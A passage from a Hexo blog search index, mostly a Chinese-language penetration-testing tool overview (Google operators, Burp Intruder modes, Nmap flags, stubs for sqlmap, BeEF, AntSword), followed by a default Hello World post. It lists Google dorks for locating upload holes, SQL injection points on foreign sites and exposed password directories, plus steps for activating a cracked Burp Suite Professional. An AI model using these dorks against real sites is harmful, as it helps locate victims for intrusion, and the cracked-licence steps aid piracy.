href="#3-2-常用命令（Edge也可用）" class="headerlink" title="3.2 常用命令（Edge也可用）"></a>3.2 常用命令（Edge也可用）</h4><ul><li><p><code>allinanchor / allintext / allintitle / allinurl:word word ...</code></p><blockquote><p>限制搜索结果为指定位置包含了所有 word 的网址。（anchor，正文，标题，url中）</p></blockquote></li><li><p><code>other incanchor / intext / intitle / inurl:word  ...</code></p><blockquote><p>限制指定位置包含 word，其他位置包含 other。</p></blockquote></li><li><p><code>insubject:&quot;word&quot; ...</code> </p><blockquote><p>限制主题包含。</p></blockquote></li><li><p><code>cache:url</code> </p><blockquote><p>当前 url 的快照。（url要求完整（<a href="http://www.baidu.com/">www.baidu.com</a>），cache 与 url 之间不能有空格）</p></blockquote></li><li><p><code>define:word</code> </p><blockquote><p>词的定义。</p></blockquote></li><li><p><code>filetype:word</code> </p><blockquote><p>返回特定文件类型的网页，如：filetype:pdf。</p></blockquote></li><li><p><code>other site:url</code> </p><blockquote><p>查询网站下关于 other 的信息，例：javascript site:<a href="http://edu.cn/">edu.cn</a>，site后不能有空格。</p></blockquote></li></ul><h4 id="3-3-不常用但有用"><a href="#3-3-不常用但有用" class="headerlink" title="3.3 不常用但有用"></a>3.3 不常用但有用</h4><ul><li><p>个人信息</p><ul><li><p><code>other author:word</code></p><blockquote><p>作者名或邮箱，一部分或完整。</p><p>例：<code>children author:john author:doe</code>（作者为 John doe 的包含 children 的文章）</p></blockquote></li></ul></li></ul><ul><li><p><code>other group:word</code></p><blockquote><p>用户组查询，同作者查询。</p></blockquote></li></ul><ul><li><p><code>other location:word</code></p><blockquote><p>地点查询。</p><p>例：<code>location:canada</code></p></blockquote></li></ul><ul><li><p><code>movie:word</code></p><blockquote><p>电影查询，仅支持英文Google。</p></blockquote></li></ul><ul><li><p><code>safesearch:word</code> </p><blockquote><p>安全搜索，不一定安全。</p></blockquote></li></ul><ul><li><p><code>other source:word</code> </p><blockquote><p>限定源。</p><p>例：<code>election source:new_york_times</code></p></blockquote></li></ul><ul><li><p><code>stocks:word</code></p><blockquote><p>返回相关股票信息，信息一般来自专业财经网站。</p></blockquote></li></ul><ul><li><p><code>other store:word</code> </p><blockquote><p>搜索商店 word 中的关键词 other。</p></blockquote></li></ul><ul><li><p>网站信息</p><ul><li><p><code>info:url</code> </p><blockquote><p>网站相关信息。</p><p>例：<code>info:baidu.com</code></p></blockquote></li></ul></li></ul><ul><li><p><code>link:url</code> </p><blockquote><p>和 url 做了链接的网站。</p><p>例：<code>link:www.baidu.com</code></p></blockquote></li></ul><ul><li><p>美国信息</p><ul><li><p><code>other phonebook:where where</code> </p><blockquote><p>美国跟关键词有关的电话信息，需要指定州名和地点名，例：<code>phonebook:smith ca</code>。</p></blockquote></li></ul></li></ul><ul><li><p><code>bphonebook:word</code></p><blockquote><p>返回商务电话资料。</p></blockquote></li></ul><ul><li><p><code>rphonebook:word</code> </p><blockquote><p>关键词相关的住宅电话信息。</p></blockquote></li></ul><h4 id="3-4-不推荐使用"><a href="#3-4-不推荐使用" class="headerlink" title="3.4 不推荐使用"></a>3.4 不推荐使用</h4><ul><li><p><code>datarange:time-time</code> </p><blockquote><p>限定时间段，格式是天文学的儒略日，会返回莫名其妙的东西。</p></blockquote></li><li><p><code>ext</code></p><blockquote><p>没用，可以用 filetype 找 ext 文件。</p></blockquote></li><li><p><code>id</code> </p><blockquote><p>没用。</p></blockquote></li><li><p><code>city tq</code> </p><blockquote><p>天气。</p><p>例：<code>北京 tq</code></p></blockquote></li><li><p><code>city weather</code></p><blockquote><p>天气。</p></blockquote></li></ul><h4 id="3-5-高级用法"><a href="#3-5-高级用法" class="headerlink" title="3.5 高级用法"></a>3.5 <a href="https://www.cnblogs.com/lsgxeva/p/10474856.html">高级用法</a></h4><ul><li><p>连接符</p><blockquote><p>默认：多个关键词之间默认 AND</p></blockquote><ul><li>or：snowblower OR snowmobile 或者 snowblower ( snowmobile OR “Green Bay” )（OR 也可以用 | 代替）</li><li>-：不包括关键字，如：snowblower -“Green Bay”</li><li>+：强制查询被 Google 忽略的常用字</li><li>“” / 《》：精确搜索，防止自动分词</li></ul></li><li><p>特征码定位</p><blockquote><p>例：Photoshop CS4任务信息——详细信息：文件创建成功，开始下载数据……等</p><p>可以在浏览器中直接搜索 Photoshop CS4 文件创建成功，开始下载数据……</p></blockquote></li><li><p>其他功能</p><blockquote><p>手气不错：得到 Google 认为最符合你搜索结果的页面，如：president -&gt; www.whitehouse.gov</p><p>多数浏览器大小写敏感，但Google不区分。</p></blockquote></li><li><p>漏洞利用</p><ol><li>查看服务器使用的程序：site:xx.com typefile:asp / php / jsp</li><li>上传漏洞：site:xx.com inurl:file / load</li><li>注射点：site:tw / jp / ko inurl:asp?id= （台湾 / 日本 / 韩国）</li><li><code>index of &lt;suffix&gt;</code>：获取网站数据（mp3,admin,jpg,pdf,doc,game,download,password,…）</li></ol></li><li><p>关键字</p><blockquote><p>最重要的记住页面一些关键的字 具有一定的特性的比如 [转到父目录]</p><p>这几个字虽然很普通但是不要忘了一般有遍历目录漏洞的站点都有如下漏洞</p></blockquote><ol><li>bbs/data/+转到父目录</li><li>data/+转到父目录</li><li>/+转到父目录</li><li>转到父目录rmvb</li><li>inurl:/diy.asp</li></ol></li></ul><h3 id="4-Firefox"><a href="#4-Firefox" class="headerlink" title="4 Firefox"></a>4 Firefox</h3><ul><li><p>配置</p><blockquote><p>不安全链接：about:config——security.enterprise_roots.enabled = true</p></blockquote></li><li><p>插件</p><ul><li>SwitchyOmega：代理软件</li><li>hackbar：网盘安装。</li></ul></li><li><p>burp suite证书</p><blockquote><p>下载证书：<a href="http://burp">http://burp</a></p><p>选项——高级——证书——导入证书</p></blockquote></li></ul><h3 id="5-网络空间安全"><a href="#5-网络空间安全" class="headerlink" title="5 网络空间安全"></a>5 网络空间安全</h3><ul><li><p>shodan</p><blockquote><p><a href="https://www.shodan.io/">Shodan Search Engine</a></p></blockquote></li><li><p>Zoomeye</p><blockquote><p><a href="https://www.zoomeye.org/">ZoomEye(“钟馗之眼”)</a></p><p><a href="https://www.zoomeye.org/component">组件页面</a></p></blockquote></li><li><p>FOFA</p><blockquote><p><a href="https://fofa.info/">FOFA网络空间测绘系统</a></p></blockquote></li><li><p>Quake：网络空间测绘</p><blockquote><p><a href="https://quake.360.net/quake/#/index">360网络空间测绘 — 因为看见，所以安全</a></p></blockquote></li></ul><h3 id="6-CDN"><a href="#6-CDN" class="headerlink" title="6 CDN"></a>6 CDN</h3><blockquote><p>内容分发网络。</p></blockquote><hr><h2 id="三、发包工具"><a href="#三、发包工具" class="headerlink" title="三、发包工具"></a>三、发包工具</h2><h3 id="1-curl"><a href="#1-curl" class="headerlink" title="1 curl"></a>1 curl</h3><blockquote><p><a href="https://github.com/curl/curl">curl安装</a></p></blockquote><ul><li>命令<ul><li><code>curl url</code>：get请求</li><li><code>curl -X -POST / -XPOST [ -d &#39;&#123; key:value &#125;&#39; ] url</code>：post请求（-d携带数据）</li><li><code>curl -XPUT url</code>：上传数据</li><li><code>curl -XDELETE url</code>：删除数据</li></ul></li><li>参数<ul><li><code>-H &#39;str&#39;</code>：加入首部（只带一个，多个需要写多个-H）</li><li>-I：获得首部响应信息</li><li>-O：下载到当前文件夹</li><li><code>-o path url</code>：指定下载路径</li><li><code>--limit-rate &lt;v&gt; url</code>：限制下载速度（默认字节）（和-O / -o一起使用）</li><li>-C - ：终止下载后恢复下载（和-O / -o一起使用）</li><li>-L：跟随重定向（默认不跟随）</li><li>-v：显示底层链接信息</li><li><code>-u user:passwd</code>：认证用户名和密码（和-O / -o一起使用可以利用 FTP 协议下载文件，-T path url：则可以利用 FTP 上传文件）</li><li><code>--proxy &quot;protocol://user:passwd@proxy_ip:port&quot; url</code>：挂代理访问</li></ul></li></ul><hr><h2 id="四、集成工具"><a href="#四、集成工具" class="headerlink" title="四、集成工具"></a>四、集成工具</h2><h3 id="1-BurpSuite"><a href="#1-BurpSuite" class="headerlink" title="1 BurpSuite"></a>1 BurpSuite</h3><ul><li><p>注册</p><ol><li>打开 Burp Suite Professional CN.vbs。</li><li>打开 BurpSuiteLoader.jar。</li><li>复制 License 到 vbs 中。</li><li>复制 Requset 到 jar 中。</li><li>复制 Response 到 vbs 中。</li></ol></li><li><p>Intruder</p><ol><li><p>默认为sniper模式</p><blockquote><p>即如果有多个变量，对每个变量依次进行破解，一次只替换一个变量。</p><p>也就是说，如果有username和password两个变量，那么它会先对username进行爆破，password字段不会改变，然后username不变，再对password字段进行爆破。</p></blockquote></li><li><p>Battering ram 模式</p><blockquote><p>对多个变量同时进行破解。</p><p>比如有username和password两个字段，使用字典进行破解，那么每次都会用字典中的一个值将两个变量同时替换。</p></blockquote></li><li><p>pitchfork模式</p><blockquote><p>每个变量对应一个字典，比如username和password，依次取其对应的字典中的一条数据对相应变量进行替换，如果两个字典条数不一样，那么一共会执行条数较少的那么多次，即不会交叉替换，只会按每个字典的顺序进行替换。</p></blockquote></li><li><p>Cluster bomb模式</p><blockquote><p>这种模式在pitchfork模式上进行了改进， 即把不同变量对应的字典中的值进行了排列组合，实现了不同的组合攻击。</p></blockquote></li></ol></li></ul><h3 id="2-Metaspolit（KaliLinux）"><a href="#2-Metaspolit（KaliLinux）" class="headerlink" title="2 Metaspolit（KaliLinux）"></a>2 Metaspolit（KaliLinux）</h3><blockquote><p><a href=".\c5fc2764">text::Kali Linux</a> </p></blockquote><hr><h2 id="五、信息收集"><a href="#五、信息收集" class="headerlink" title="五、信息收集"></a>五、信息收集</h2><h3 id="1-maltego（KaliLinux）"><a href="#1-maltego（KaliLinux）" class="headerlink" title="1 maltego（KaliLinux）"></a>1 maltego（KaliLinux）</h3><blockquote><p><a href=".\c5fc2764">text::Kali Linux</a> </p><p>被动信息收集一键版【kali】</p></blockquote><h3 id="2-sn0int（KaliLinux）"><a href="#2-sn0int（KaliLinux）" class="headerlink" title="2 sn0int（KaliLinux）"></a>2 sn0int（KaliLinux）</h3><blockquote><p><a href=".\c5fc2764">text::Kali Linux</a> </p><p>被动信息收集工具集【kali】</p></blockquote><h3 id="3-Nmap（KaliLinux）"><a href="#3-Nmap（KaliLinux）" class="headerlink" title="3 Nmap（KaliLinux）"></a>3 Nmap（KaliLinux）<img src="/posts/5cfe0bd9/Nmap.jpg" alt="img"></h3><blockquote><p><a href="https://nmap.org/dist/nmap-7.93-setup.exe">zenmap安装</a></p><p>主要功能：主机存活检测、端口探测、服务识别、操作系统识别。</p><p>Q1：无结果显示后就新建一个扫描。</p></blockquote><h4 id="3-1-扫描方式"><a href="#3-1-扫描方式" class="headerlink" title="3.1 扫描方式"></a>3.1 扫描方式</h4><div class="table-container"><table><thead><tr><th>参数</th><th>作用</th></tr></thead><tbody><tr><td>-sS / sT / sA / sW / sM</td><td>TCP SYN扫描（半开扫描，默认扫描方式）、TCP connect()扫描、ACK扫描、TCP窗口扫描、TCP Maimon扫描</td></tr><tr><td>-sU</td><td>UDP扫描</td></tr><tr><td>-sN / sF / sX</td><td>TCP Null扫描、FIN扫描、Xmas扫描</td></tr><tr><td>—scanflags</td><td>自定义TCP包中的 flags</td></tr><tr><td>-sI zombie host[ : probeport ]</td><td>通过指定的僵尸主机发送扫描数据包</td></tr><tr><td>-sY / sZ</td><td>SCTP INIT扫描和COOKIE-ECHO扫描</td></tr><tr><td>-sO</td><td>使用IP扫描确定目标机支持的协议类型</td></tr><tr><td>-b “FTP relay host”</td><td>使用FTP bounce扫描</td></tr></tbody></table></div><h4 id="3-2-主机存活发现"><a href="#3-2-主机存活发现" class="headerlink" title="3.2 主机存活发现"></a>3.2 主机存活发现</h4><div class="table-container"><table><thead><tr><th>参数</th><th>作用</th></tr></thead><tbody><tr><td>-sL</td><td>仅仅显示扫描的IP地址数目，不会进行任何扫描</td></tr><tr><td>-sn</td><td>ping 扫描，即主机发现</td></tr><tr><td>-Pn</td><td>不检测主机存活</td></tr><tr><td>-PS / PA / PU / PY[ portlist ]</td><td>使用TCP SYN ping、TCP ACK ping、UDP ping发现主机</td></tr><tr><td>-PE / PP / PM</td><td>使用ICMP信息请求、时间戳请求、地址掩码请求包发现主机</td></tr><tr><td>-PO[ protocol list ]</td><td>使用IP协议包探测对方主机是否开启</td></tr><tr><td>-n / -R</td><td>不对IP地址进行域名反向解析、对所有IP地址都进行域名的反向解析</td></tr></tbody></table></div><h4 id="3-3-主机端口发现"><a href="#3-3-主机端口发现" class="headerlink" title="3.3 主机端口发现"></a>3.3 主机端口发现</h4><div class="table-container"><table><thead><tr><th>参数</th><th>作用</th></tr></thead><tbody><tr><td>-p</td><td>指定端口或端口范围。（-p 80 / -p 1-65535）</td></tr><tr><td>-p U : PORT</td><td>扫描UDP的某个端口。（-p U:53）</td></tr><tr><td>-F</td><td>快速扫描模式，比默认扫描的端口少</td></tr><tr><td>-r</td><td>不随机扫描端口，默认是随机扫描</td></tr><tr><td>-top-ports “number”</td><td>扫描开放概率最高的 number 个端口。开放概率参考 nmap-services文件，Ubuntu中在/usr/share/nmap.nmap中，默认扫描前1000个</td></tr></tbody></table></div><h4 id="3-4-服务版本识别"><a href="#3-4-服务版本识别" class="headerlink" title="3.4 服务版本识别"></a>3.4 服务版本识别</h4><div class="table-container"><table><thead><tr><th>参数</th><th>作用</th></tr></thead><tbody><tr><td>-sV</td><td>开放版本检测，可以同时使用-A 进行操作系统检测和版本检测</td></tr><tr><td>—version-intensity “level”</td><td>设置版本扫描强度，level指定使用哪些检测报文，越高服务越可能被正确识别，默认7</td></tr><tr><td>—version-light</td><td>轻量模式，为—version-intensity 2 别名。</td></tr><tr><td>—version-all</td><td>所有检测，为—version-intensity 9 别名</td></tr><tr><td>—version-trace</td><td>显示详细的版本检测过程信息</td></tr></tbody></table></div><h4 id="3-5-操作系统识别"><a href="#3-5-操作系统识别" class="headerlink" title="3.5 操作系统识别"></a>3.5 操作系统识别</h4><blockquote><p>所有操作系统信息存在nmap-os-db中</p></blockquote><div class="table-container"><table><thead><tr><th>参数</th><th>作用</th></tr></thead><tbody><tr><td>-O</td><td>操作系统检测，可以同时使用-A 进行操作系统检测和版本检测</td></tr><tr><td>—osscan-limit</td><td>针对指定的目标进行操作系统检测（至少需确知该主机分别有一个 open 和 closed 端口）</td></tr><tr><td>—osscan-guess</td><td>推测操作系统检测结果。Nmap无法确定时会尽可能提供最相近匹配，这是默认匹配模式</td></tr></tbody></table></div><h4 id="3-6-输出结果"><a href="#3-6-输出结果" class="headerlink" title="3.6 输出结果"></a>3.6 输出结果</h4><div class="table-container"><table><thead><tr><th>参数</th><th>作用</th></tr></thead><tbody><tr><td>oN</td><td>将标准输出直接写入指定的文件</td></tr><tr><td>-oX</td><td>输出XML文件</td></tr><tr><td>-oS</td><td>输出全大写</td></tr><tr><td>-oG</td><td>输出便于通过bash或Perl处理的格式，而非XML文件</td></tr><tr><td>-oA BASENAME</td><td>将扫描结果以标准格式、XML格式和Grep格式一次性输出</td></tr><tr><td>-v</td><td>提高输出的详细度</td></tr><tr><td>-d level</td><td>设置 debug 级别，最高是 9</td></tr><tr><td>—reason</td><td>显示端口处于特定状态的原因</td></tr><tr><td>—open</td><td>只输出端口状态为open的端口</td></tr><tr><td>—packet-trace</td><td>显示所有发送或者接收到的数据包</td></tr><tr><td>—iflist</td><td>显示路由信息和端口</td></tr><tr><td>—log-errors</td><td>输出日志等级为 errors 和 warnings 的日志</td></tr><tr><td>—append-output</td><td>追加到指定文件后</td></tr><tr><td>—resume FILENAME</td><td>恢复已停止的扫描</td></tr><tr><td>—stylesheet PAHT / URL</td><td>将 XML 输出转化为 HTML 和 XSL 样式表</td></tr><tr><td>—Webxml</td><td>从nmap.org得到 XML 的样式</td></tr><tr><td>—-no-stylesheet</td><td>忽略 XML 声明的 XSL 样式表</td></tr><tr><td><code>--scrpit &lt;script&gt;</code></td><td>使用脚本检测（nmap自带脚本库）</td></tr></tbody></table></div><h3 id="4-AWVS：Web扫描"><a href="#4-AWVS：Web扫描" class="headerlink" title="4 AWVS：Web扫描"></a>4 AWVS：Web扫描</h3><h3 id="5-X-ray：Web扫描"><a href="#5-X-ray：Web扫描" class="headerlink" title="5 X-ray：Web扫描"></a>5 X-ray：Web扫描</h3><h3 id="6-Nessus：主机扫描"><a href="#6-Nessus：主机扫描" class="headerlink" title="6 Nessus：主机扫描"></a>6 Nessus：主机扫描</h3><hr><h2 id="六、漏洞利用"><a href="#六、漏洞利用" class="headerlink" title="六、漏洞利用"></a>六、漏洞利用</h2><h3 id="1-Sqlmap（KaliLinux）"><a href="#1-Sqlmap（KaliLinux）" class="headerlink" title="1 Sqlmap（KaliLinux）"></a>1 Sqlmap（KaliLinux）</h3><blockquote><p><a href=".\c5fc2764">text::Kali Linux</a> </p></blockquote><h3 id="2-Gopher（KaliLinux）：SSRF利用"><a href="#2-Gopher（KaliLinux）：SSRF利用" class="headerlink" title="2 Gopher（KaliLinux）：SSRF利用"></a>2 Gopher（KaliLinux）：SSRF利用</h3><h3 id="3-Jeboss（KaliLinux）"><a href="#3-Jeboss（KaliLinux）" class="headerlink" title="3 Jeboss（KaliLinux）"></a>3 Jeboss（KaliLinux）</h3><h3 id="4-BeEf（KaliLinux）：XSS攻击"><a href="#4-BeEf（KaliLinux）：XSS攻击" class="headerlink" title="4 BeEf（KaliLinux）：XSS攻击"></a>4 BeEf（KaliLinux）：XSS攻击</h3><hr><h2 id="七、Webshell"><a href="#七、Webshell" class="headerlink" title="七、Webshell"></a>七、Webshell</h2><h3 id="1-蚁剑"><a href="#1-蚁剑" class="headerlink" title="1 蚁剑"></a>1 蚁剑</h3><blockquote><p><a href="https://github.com/AntSwordProject/">蚁剑下载</a></p></blockquote><hr><h2 id="八、目录工具"><a href="#八、目录工具" class="headerlink" title="八、目录工具"></a>八、目录工具</h2><h3 id="1-subdomainsbrute：子域名爆破"><a href="#1-subdomainsbrute：子域名爆破" class="headerlink" title="1 subdomainsbrute：子域名爆破"></a>1 subdomainsbrute：子域名爆破</h3><h3 id="2-dirb（KaliLinux）：目录扫描"><a href="#2-dirb（KaliLinux）：目录扫描" class="headerlink" title="2 dirb（KaliLinux）：目录扫描"></a>2 dirb（KaliLinux）：目录扫描</h3><blockquote><p><a href=".\c5fc2764">text::Kali Linux</a> </p></blockquote><h3 id="3-dirsearch（KaliLinux）：目录扫描"><a href="#3-dirsearch（KaliLinux）：目录扫描" class="headerlink" title="3 dirsearch（KaliLinux）：目录扫描"></a>3 dirsearch（KaliLinux）：目录扫描</h3><blockquote><p><a href=".\c5fc2764">text::Kali Linux</a> </p></blockquote><h3 id="4-御剑后台扫描：目录扫描"><a href="#4-御剑后台扫描：目录扫描" class="headerlink" title="4 御剑后台扫描：目录扫描"></a>4 御剑后台扫描：目录扫描</h3><h3 id="5-Tkbscan：Web路径探测"><a href="#5-Tkbscan：Web路径探测" class="headerlink" title="5 Tkbscan：Web路径探测"></a>5 Tkbscan：Web路径探测</h3><hr><h2 id="九、编程语言"><a href="#九、编程语言" class="headerlink" title="九、编程语言"></a>九、编程语言</h2><blockquote><p><a href=".\2810fc66">text::Python渗透</a></p></blockquote><hr><h2 id="十、测试网站"><a href="#十、测试网站" class="headerlink" title="十、测试网站"></a>十、测试网站</h2><ul><li>ping网站：<a href="https://ping.chinaz.com/">https://ping.chinaz.com/</a></li><li><p>测试网站：<a href="http://demo.testfire.net/">Altoro Mutual (testfire.net)</a></p></li><li><p>本地搭建：DWVA——配置文件改后缀——改密码和数据库一样（root/root）</p><ul><li>sqli-labs：<a href="https://gitcode.net/mirrors/audi-1/sqli-labs?utm_source=csdn_github_accelerator（db-creds.inc：改密码）">https://gitcode.net/mirrors/audi-1/sqli-labs?utm_source=csdn_github_accelerator（db-creds.inc：改密码）</a></li><li>ctf-wiki：<a href="https://github.com/ctf-wiki/ctf-wiki">ctf-wiki/ctf-wiki: Come and join us, we need you! (github.com)</a> &amp;&amp; <a href="https://blog.csdn.net/qq_60923912/article/details/124288187">(8条消息) ctf-wiki本地搭建记录_如何下载ctfwiki_goodlunatic的博客-CSDN博客</a></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 概述 </tag>
            
            <tag> Web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/posts/4a17b156.html"/>
      <url>/posts/4a17b156.html</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
